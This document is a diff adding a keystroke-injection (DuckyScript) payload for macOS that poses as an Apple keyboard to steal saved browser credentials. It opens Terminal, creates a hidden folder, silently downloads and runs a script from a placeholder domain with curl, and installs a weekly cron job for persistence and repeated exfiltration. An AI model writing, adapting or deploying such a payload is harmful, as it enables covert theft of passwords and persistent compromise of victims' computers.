@@ -1,0 +1,33 @@
+ID 05ac:021e Apple:Keyboard
+
+REM Author: sud0cat
+REM Description: Exfiltrate saved credentials from browsers
+REM Target: macOS
+
+REM Open terminal
+GUI SPACE
+DELAY 1000
+STRING terminal
+DELAY 500
+ENTER
+
+REM Create hidden folder in user directory
+DELAY 1000
+STRING mkdir ~/.hidden
+ENTER
+
+REM Download the shell script
+STRING ((curl -o ~/.hidden/browserdata.sh https://your.domain.com/browserdata.sh &> /dev/null &)&)
+ENTER
+
+REM Run the shell script
+DELAY 500
+STRING ((sh ~/.hidden/browserdata.sh &> /dev/null &)&)
+ENTER
+
+REM Setup persistence and efil data at 00:00 every Sunday
+STRING chmod +x ~/.hidden/browserdata.sh && echo "0 0 * * 0 ~/.hidden/browserdata.sh" | crontab -
+ENTER
+
+REM Quit terminal
+GUI Q
